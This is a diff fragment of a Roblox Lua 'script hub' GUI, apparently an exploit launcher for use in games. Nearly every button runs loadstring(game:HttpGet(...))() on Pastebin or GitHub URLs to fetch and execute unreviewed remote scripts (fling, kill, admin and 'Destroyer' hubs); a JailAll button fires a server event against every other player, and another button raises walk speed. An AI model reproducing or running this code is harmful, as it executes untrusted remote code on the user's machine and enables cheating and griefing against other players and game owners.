+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/2tJBN38N"))()
+end)
+
+ScreenGui.RussainKick.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1P37qYeV"))()
+end)
+
+ScreenGui.InsanityPowers.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ygWAZh5A"))()
+end)
+
+ScreenGui.Zen.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/o5u3/Zen/main/ZenFlingFE.txt"))()
+end)
+
+ScreenGui.HellRobotics.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/cF4yBbWs"))()
+end)
+
+ScreenGui.Pillow.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RbKLMpdt"))()
+end)
+
+ScreenGui.Pp.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/MMDGHMq1"))()
+end)
+
+ScreenGui.RainbowKing.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Xfxx4qJ0"))()
+end)
+
+ScreenGui.TouchKill.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/KaYHHvh7"))()
+end)
+
+ScreenGuiTakeTheL.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/VkWkuyzc"))()
+end)
+
+ScreenGui.BlackHole.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/4zY4XvvA"))()
+end)
+
+ScreenGui.JhonDoe.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/DwhVGxTs"))()
+end)
+
+ScreenGui.Neko.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/7i7CsTPe"))()
+end)
+
+ScreenGui.Boobs.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/8ASG9gWB"))()
+end)
+
+ScreenGui.Rtx.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ba5A2mXj"))()
+end)
+
+ScreenGui.VR.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/uZWAvTxC"))()
+end)
+
+ScreenGui.Gun.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0Jv3udmi"))()	
+end)
+
+ScreenGui.Titain.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/qSMz7Uiu',true))()	
+end)
+
+ScreenGui.PixelCar.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/1Nmes8yC"))()
+end)
+
+ScreenGui.Eggdog.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGetAsync("https://pastebin.com/raw/rkAD6D4J"))()
+end)
+
+ScreenGui.FlingGui.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+end)
+
+ScreenGui.KZSHuB.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/qx1MRVYV"))()
+end)
+
+ScreenGui.LostPoint.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/JunglePush/LostPoint/main/LostPointScript"))()
+end)
+
+ScreenGui.MOONUV10.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
+end)
+
+ScreenGui.MrDestroyerHub.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/sedatrek/Destroyer/main/destroy"))()
+end)
+
+ScreenGui.MrDestroyerHubv2.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MrDestroyerSkid/Project-Destroyer/main/Destroyer"))()
+end)
+
+ScreenGui.SniffHub.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/Sniff-Hub/main/Sniff%20Hub'))()
+end)
+
+ScreenGui.T0PKEKV40.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/sedatrek/T0PKEK-V4/main/t0pkek'))()
+end)
+
+ScreenGui.TrollingGui.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+end)
+
+ScreenGui.VHub.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
+end)
+
+ScreenGui.c00lkiddguiv1.MouseButton1Click:Connect(function()
+	loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
+end)
+
+ScreenGui.c00lkiddguiv2.MouseButton1Click:Connect(function()
+	loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
+end)
+
+ScreenGui.CMDX.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+end)
+
+ScreenGui.FatesAdmin.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+end)
+
+ScreenGui.GABXV2.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/vUxYGFXR"))();
+end)
+
+ScreenGui.GoldenRadio.MouseButton1Click:Connect(function()
+	-- GPlayr by ModernLukest. Made for v3rmillion, , etc.
+	-- Note that anyone can hear the music that you play. Just a clarification for what LocalScripts can do.
+
+	local char = game.Players.LocalPlayer.Character
+
+
+
+	-- CREATING BUTTONS, LABELS, FRAMES, ETC.
+	local gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui) -- CoreGui is buggy, since GPlayr is designed for PlayerGuis, not CoreGuis.
+	local openbtn = Instance.new("TextButton", gui)
+	local closebtn = Instance.new("TextButton", gui)
+	local openguibtn = Instance.new("TextButton", gui)
+	local playmusicint = Instance.new("Frame", gui)
+	local playmusicbtn = Instance.new("ImageButton", playmusicint)
+	local stopmusicbtn = Instance.new("ImageButton", playmusicint)
+	local musicidbox = Instance.new("TextBox", playmusicint)
+	local credit = Instance.new("TextLabel", playmusicint)
+	local title = Instance.new("TextLabel", playmusicint)
+
+	-- SIZING --
+
+	openbtn.Size = UDim2.new(0, 100, 0, 50)
+	closebtn.Size = UDim2.new(0, 100, 0, 50)
+	openguibtn.Size = UDim2.new(0, 100, 0, 50)
+	playmusicbtn.Size = UDim2.new(0, 50, 0, 50)
+	stopmusicbtn.Size = UDim2.new(0, 57, 0, 57)
+	musicidbox.Size = UDim2.new(0, 300, 0, 50)
+	credit.Size = UDim2.new(0, 300, 0, 20)
+	title.Size = UDim2.new(0, 300, 0, 30)
+	playmusicint.Size = UDim2.new(0, 300, 0, 500)
+
+	-- POSITIONING --
+
+	openbtn.Position = UDim2.new(0, 0, 0, 510)
+	closebtn.Position = UDim2.new(0, 0, 0, 510)
+	openguibtn.Position = UDim2.new(0, 0, 0, 590)
+	playmusicbtn.Position = UDim2.new(0, 50, 0, 200)
+	stopmusicbtn.Position = UDim2.new(0, 175, 0, 197)
+	musicidbox.Position = UDim2.new(0, 0, 0, 100)
+	credit.Position = UDim2.new(0, 0, 0, 470)
+	title.Position = UDim2.new(0, 0, 0, 0)
+	playmusicint.Position = UDim2.new(0, 200, 0, 100)
+
+	-- SET TEXT --
+
+	title.Text = "GPlayr (BETA)"
+	credit.Text = "GPlayr & radio scripting by Developer / ModernLukest"
+	musicidbox.Text = "Enter Sound ID Here"
+	openbtn.Text = "Take Out Radio"
+	closebtn.Text = "Put Away Radio"
+	openguibtn.Text = "Open/Close Music GUI"
+
+	-- SET IMAGE IDS --
+	playmusicbtn.Image = "rbxassetid://499381047"
+	stopmusicbtn.Image = "rbxassetid://499381006"
+
+	-- BACKGROUND COLOR3 --
+
+	playmusicint.BackgroundColor3 = Color3.new(136, 136, 136)
+	openbtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	closebtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	openguibtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	musicidbox.BackgroundColor3 = Color3.fromRGB(109, 109, 109)
+
+	-- BACKGROUND TRANSPARENCY --
+
+	playmusicint.BackgroundTransparency = 0.9
+	playmusicbtn.BackgroundTransparency = 1
+	stopmusicbtn.BackgroundTransparency = 1
+	musicidbox.BackgroundTransparency = 0.43
+	credit.BackgroundTransparency = 1
+	title.BackgroundTransparency = 1
+
+	-- BORDER SIZE PIXEL --
+
+	musicidbox.BorderSizePixel = 0
+	openbtn.BorderSizePixel = 3
+	closebtn.BorderSizePixel = 3
+	openguibtn.BorderSizePixel = 3
+
+	-- FONTS --
+	musicidbox.Font = "SourceSansLight"
+	credit.Font = "SourceSansLight"
+	title.Font = "SourceSansLight"
+
+
+	-- TEXT SCALED --
+	credit.TextScaled = true
+	title.TextScaled = true
+
+	-- TEXT WRAPPED --
+	musicidbox.TextWrapped = true
+	credit.TextWrapped = true
+	title.TextWrapped = true
+	openguibtn.TextWrapped = true
+
+	-- FONT SIZE --
+	musicidbox.FontSize = "Size28"
+
+	-- ACTIVE --
+	playmusicint.Active = true
+
+	-- DRAGGABLE --
+	playmusicint.Draggable = true
+
+	-- GUI FUNCTIONS (MAIN) --
+
+	-- set up the stuff --
+	isGuiOpen = false
+	closebtn.Visible = false
+	playmusicint.Visible = false
+	openguibtn.Visible = false
+
+	openbtn.MouseButton1Click:connect(function()
+		openbtn.Visible = false
+		closebtn.Visible = true
+
+		local radio = Instance.new("Part", char)
+		radio.Name = "Radio"
+		local mesh = Instance.new("FileMesh", radio)
+		mesh.MeshId = "http://www.roblox.com/asset/?id=212302951"
+		mesh.TextureId = "http://www.roblox.com/asset/?id=212303049"
+		mesh.Scale = Vector3.new(4, 4, 4)
+		mesh.VertexColor = Vector3.new(1, 1, 1)
+		mesh.Offset = Vector3.new(0, 0, 0)
+
+
+		local function weldBetween(a, b)
+			local weld = Instance.new("ManualWeld")
+			weld.Part0 = a
+			weld.Part1 = b
+			weld.C0 = CFrame.new()
+			weld.C1 = b.CFrame:inverse() * a.CFrame
+			weld.Parent = a
+			return weld;
+		end
+		local hand = radio:clone()
+		hand.Parent=char
+		hand.CFrame=char:WaitForChild("Torso").CFrame*CFrame.new(Vector3.new(0,0,0.9))*CFrame.Angles(0,math.rad(180),math.rad(45))
+		weldBetween(char:WaitForChild("Torso"), hand)
+		hand.CanCollide=true
+		hand.Anchored=false
+
+		sound = Instance.new("Sound", hand) -- we will now call the radio "hand"
+		sound.Volume = 0.5
+		sound.Pitch = 1
+
+		openguibtn.Visible = true
+		char:FindFirstChild("Radio"):Destroy()
+	end)
+
+
+	closebtn.MouseButton1Click:connect(function()
+		openbtn.Visible = true
+		closebtn.Visible = false
+		openguibtn.Visible = false
+		playmusicint.Visible = false
+		isGuiOpen = false
+		char:WaitForChild("Radio"):Destroy()
+	end)
+
+	playmusicbtn.MouseButton1Click:connect(function()
+		sound:stop()
+		wait(0.2)
+		sound.SoundId = "rbxassetid://"..musicidbox.Text
+		sound:play()
+	end)
+
+	stopmusicbtn.MouseButton1Click:connect(function()
+		sound:stop()
+	end)
+
+
+	openguibtn.MouseButton1Click:connect(function()
+		if isGuiOpen == false then isGuiOpen = true
+			playmusicint.Visible = true else isGuiOpen = false playmusicint.Visible = false
+		end
+	end)
+end)
+
+ScreenGui.InfiniteYield.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+ScreenGui.JailAll.MouseButton1Click:Connect(function()
+	for i,v in pairs(game.Players:GetPlayers()) do 
+		if v.Name~=game.Players.LocalPlayer.Name then 
+			game.ReplicatedStorage.Events.Jail:FireServer(v)
+		end
+	end
+end)
+
+ScreenGui.SitWalk.MouseButton1Click:Connect(function()
+	local Template = Instance.new("ScreenGui")
+	local Frame = Instance.new("Frame")
+	local Frame_2 = Instance.new("Frame")
+	local RUN = Instance.new("TextButton")
+	local ARROW = Instance.new("TextButton")
+	local NAME = Instance.new("TextButton")
+
+	--Properties:
+
+	Template.Name = "Template"
+	Template.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	Template.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	Frame.Parent = Template
+	Frame.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+	Frame.BorderSizePixel = 0
+	Frame.Position = UDim2.new(0.0362374708, 0, 0.482208639, 0)
+	Frame.Size = UDim2.new(0, 174, 0, 28)
+
+	Frame_2.Parent = Frame
+	Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Frame_2.BorderSizePixel = 0
+	Frame_2.Position = UDim2.new(0, 0, 1, 0)
+	Frame_2.Size = UDim2.new(0, 174, 0, 72)
+
+	RUN.Name = "RUN"
+	RUN.Parent = Frame_2
+	RUN.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+	RUN.BorderColor3 = Color3.fromRGB(255, 255, 0)
+	RUN.BorderSizePixel = 0
+	RUN.Position = UDim2.new(0.157653749, 0, 0.222330347, 0)
+	RUN.Size = UDim2.new(0, 118, 0, 38)
+	RUN.Font = Enum.Font.PatrickHand
+	RUN.Text = "Car OFF"
+	RUN.TextColor3 = Color3.fromRGB(0, 0, 0)
+	RUN.TextSize = 50.000
+
+	ARROW.Name = "ARROW"
+	ARROW.Parent = Frame
+	ARROW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ARROW.BackgroundTransparency = 1.000
+	ARROW.BorderSizePixel = 0
+	ARROW.Position = UDim2.new(0.834664106, 0, 0, 0)
+	ARROW.Size = UDim2.new(0, 28, 0, 28)
+	ARROW.Font = Enum.Font.PatrickHand
+	ARROW.Text = "X"
+	ARROW.TextColor3 = Color3.fromRGB(0, 0, 0)
+	ARROW.TextSize = 30.000
+
+	NAME.Name = "NAME"
+	NAME.Parent = Frame
+	NAME.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	NAME.BackgroundTransparency = 1.000
+	NAME.BorderSizePixel = 0
+	NAME.Position = UDim2.new(0.369146883, 0, 0, 0)
+	NAME.Size = UDim2.new(0, 28, 0, 28)
+	NAME.Font = Enum.Font.PatrickHand
+	NAME.Text = "Car Script"
+	NAME.TextColor3 = Color3.fromRGB(0, 0, 0)
+	NAME.TextSize = 23.000
+
+	-- Scripts:
+
+	local function ICEIM_fake_script() -- RUN.LocalScript 
+		local script = Instance.new('LocalScript', RUN)
+
+		local Toggled = false
+		local Anim, track, hum
+
+		Anim = Instance.new("Animation")
+		Anim.AnimationId = "rbxassetid://179224234"
+
+		script.Parent.MouseButton1Click:Connect(function()
+			if not track or hum ~= game.Players.LocalPlayer.Character.Humanoid  then 
+				pcall(game.Destroy, track)
+				track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+				hum = game.Players.LocalPlayer.Character.Humanoid
+			end
+
+			if Toggled == false then
+				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 69
+				script.Parent.Text = "Car ON"
+				track:Play(.1, 1, 1)
+				Toggled = true
+			elseif Toggled == true then
+				track:Stop()
+				script.Parent.Text = "Car OFF"
+				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+				Toggled = false
+			end
+		end)
+	end
+	coroutine.wrap(ICEIM_fake_script)()
+	local function XOEAVM_fake_script() -- RUN.RGB_Script 
+		local script = Instance.new('LocalScript', RUN)
+
+		-- Made By Auradomix --
+		-- Visit My Channel On YT and Twitch = @Auradomix
+
+		-- PUT "RGB_GUI" ON STARTERGUI
+		-- PUT THIS ON ANY FRAME OR BUTTON OR BOX OR ...
+		-- ONLY ADAPTED FOR GUI, Please Referance To my Other Model For Brick
+
+		-- Local Script = Client
+		-- Script = Server
+
+		-- For more fast Server Put them as a Local Scrpit for Gui
+
+		while wait() do
+			script.Parent.BackgroundColor3 = Color3.new(255/255,0/255,0/255)
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(255/255,i/255,0/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(i/255,255/255,0/255)
+			end
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(0/255,255/255,i/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(0/255,i/255,255/255)
+			end
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(i/255,0/255,255/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(255/255,0/255,i/255)
+			end
+		end
+	end
+	coroutine.wrap(XOEAVM_fake_script)()
+	local function WMHNT_fake_script() -- Frame.RGB_Script 
+		local script = Instance.new('LocalScript', Frame)
+
+		-- Made By Auradomix --
+		-- Visit My Channel On YT and Twitch = @Auradomix
+
+		-- PUT "RGB_GUI" ON STARTERGUI
+		-- PUT THIS ON ANY FRAME OR BUTTON OR BOX OR ...
+		-- ONLY ADAPTED FOR GUI, Please Referance To my Other Model For Brick
+
+		-- Local Script = Client
+		-- Script = Server
+
+		-- For more fast Server Put them as a Local Scrpit for Gui
+
+		while wait() do
+			script.Parent.BackgroundColor3 = Color3.new(255/255,0/255,0/255)
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(255/255,i/255,0/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(i/255,255/255,0/255)
+			end
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(0/255,255/255,i/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(0/255,i/255,255/255)
+			end
+			for i = 0,255,10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(i/255,0/255,255/255)
+			end
+			for i = 255,0,-10 do
+				wait()
+				script.Parent.BackgroundColor3 = Color3.new(255/255,0/255,i/255)
+			end
+		end
+	end
+	coroutine.wrap(WMHNT_fake_script)()
+	local function XDCFV_fake_script() -- Frame.Smooth GUI Dragging 
+		local script = Instance.new('LocalScript', Frame)
+
+		local UserInputService = game:GetService("UserInputService")
+		local runService = (game:GetService("RunService"));
+
+		local gui = script.Parent
+
+		local dragging
+		local dragInput
+		local dragStart
+		local startPos
+
+		function Lerp(a, b, m)
+			return a + (b - a) * m
+		end;
+
+		local lastMousePos
+		local lastGoalPos
+		local DRAG_SPEED = (8); -- // The speed of the UI darg.
+		function Update(dt)
+			if not (startPos) then return end;
+			if not (dragging) and (lastGoalPos) then
+				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+				return 
+			end;
+
+			local delta = (lastMousePos - UserInputService:GetMouseLocation())
+			local xGoal = (startPos.X.Offset - delta.X);
+			local yGoal = (startPos.Y.Offset - delta.Y);
+			lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+		end;
+
+		gui.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = gui.Position
+				lastMousePos = UserInputService:GetMouseLocation()
+
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end)
+
+		gui.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+
+		runService.Heartbeat:Connect(Update)
+	end
+	coroutine.wrap(XDCFV_fake_script)()
+	local function MAOTEA_fake_script() -- ARROW.LocalScript 
+		local script = Instance.new('LocalScript', ARROW)
+
+		script.Parent.MouseButton1Click:Connect(function()
+			script.Parent.Parent.Frame.Visible = not script.Parent.Parent.Frame.Visible
+		end)
+
+	end
+	coroutine.wrap(MAOTEA_fake_script)()
+	local function WZVKWAF_fake_script() -- NAME.LocalScript 
+		local script = Instance.new('LocalScript', NAME)
+
+		script.Parent.MouseButton1Click:Connect(function()
+			script.Parent.Parent.Frame.Visible = not script.Parent.Parent.Frame.Visible
+		end)
+
+	end
+	coroutine.wrap(WZVKWAF_fake_script)()
+end)
+
+ScreenGui.mousefling.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Azetax/script-for-roblox/main/OP'),true))()
+end)
